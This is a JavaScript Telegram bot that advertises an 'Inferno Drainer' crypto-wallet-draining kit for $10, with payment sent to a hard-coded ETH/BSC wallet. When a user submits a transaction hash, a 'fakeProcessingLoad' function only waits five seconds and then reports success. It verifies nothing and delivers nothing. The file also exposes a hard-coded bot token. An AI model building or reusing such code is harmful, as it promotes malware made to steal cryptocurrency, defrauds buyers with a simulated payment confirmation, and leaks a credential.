const { Telegraf } = require('telegraf');

const BOT_TOKEN = '6863563327:AAG1m_Iq6VjwN-VF_3INvd-WvoqPoz-GK7A';
const ETH_WALLET_ADDRESS = '0x363B924023D06Dc98386DA4E32f108ff6545c986';
const BSC_WALLET_ADDRESS = '0x363B924023D06Dc98386DA4E32f108ff6545c986'; // Replace with the actual BSC wallet address

const bot = new Telegraf(BOT_TOKEN);

// Middleware for logging
bot.use((ctx, next) => {
    const start = new Date();
    return next().then(() => {
        const ms = new Date() - start;
        console.log(`${ctx.message.from.username} ${ctx.message.text} [${ms}ms]`);
    });
});

// Start command
bot.start((ctx) => {
    const message = `
<b>👹 Welcome to Inferno Drainer Bot 👹</b>

<b>💰 Application Cost:</b> $10

<b>👹 Upon Confirmation of Payment, You Will Receive:</b>
🔥 Files
🔥 Server
🔥 Panel
🔥 Backend
🔥 Assistance
🔥 How To Use Guide
<code>File Unlock Password: MR_INFERNO_BOT_SOFT</code>

<b>💳 Payment Methods:</b> USDT (Trc20 and ERC)`;

    const keyboard = {
        reply_markup: {
            keyboard: [['Pay with ETH', 'Pay with BSC', 'Settings']],
            resize_keyboard: true,
        },
    };

    ctx.replyWithHTML(message, keyboard);
});

// Pay with ETH command
bot.hears('Pay with ETH', (ctx) => {
    const walletAddress = '0x363B924023D06Dc98386DA4E32f108ff6545c986';
    const paymentMessage = `💪 Excellent choice! You've chosen to pay with ETH. Unleash the power of your payment!👹\n\nSend your payment to the following ETH wallet address:\n<code>${walletAddress}</code>`;

    const paymentButtons = {
        reply_markup: {
            keyboard: [['PAID 💲', 'STATUS 💲']],
            resize_keyboard: true,
        },
    };

    ctx.replyWithHTML(paymentMessage, paymentButtons);
});

// Pay with BSC command
bot.hears('Pay with BSC', (ctx) => {
    const walletAddress = '0x363B924023D06Dc98386DA4E32f108ff6545c986'; // Replace with the actual BSC wallet address
    const paymentMessage = `💪 Excellent choice! You've chosen to pay with BSC. Unleash the power of your payment!👹\n\nSend your payment to the following BSC wallet address:\n<code>${walletAddress}</code>`;

    const paymentButtons = {
        reply_markup: {
            keyboard: [['PAID 💲', 'STATUS 💲']],
            resize_keyboard: true,
        },
    };

    ctx.replyWithHTML(paymentMessage, paymentButtons);
});

// STATUS 💲 command
bot.hears('STATUS 💲', (ctx) => {
    const statusMessage = "📊 <b>Status Check:</b> Your current status is 'STATUS 💲.' We're processing your request. Please stay tuned! 🔄✨\n\nPlease provide the transaction hash for verification:";
    ctx.replyWithHTML(statusMessage, { reply_markup: { remove_keyboard: true } });
});

// PAID 💲 command
bot.hears('PAID 💲', (ctx) => {
    const paidMessage = "Thank you for your payment! Please send the transaction hash for confirmation:\\!";
    ctx.replyWithHTML(paidMessage, { reply_markup: { remove_keyboard: true } });
});

// Handle other commands and messages...

// Fake processing load moment
function fakeProcessingLoad(ctx) {
    ctx.reply("⌛️ Processing your request... This may take a moment.");
    setTimeout(() => {
        ctx.reply("✅ Your request has been processed! Thank you for your patience!");
    }, 5000); // Simulating a 5-second processing time
}

// Listen for transaction hash messages
bot.on('text', (ctx) => {
    const messageText = ctx.message.text.trim().toLowerCase();

    if (messageText.startsWith('0x')) {
        // Assume any message starting with '0x' is a transaction hash
        fakeProcessingLoad(ctx);
    }
});

// Start the bot
bot.launch();
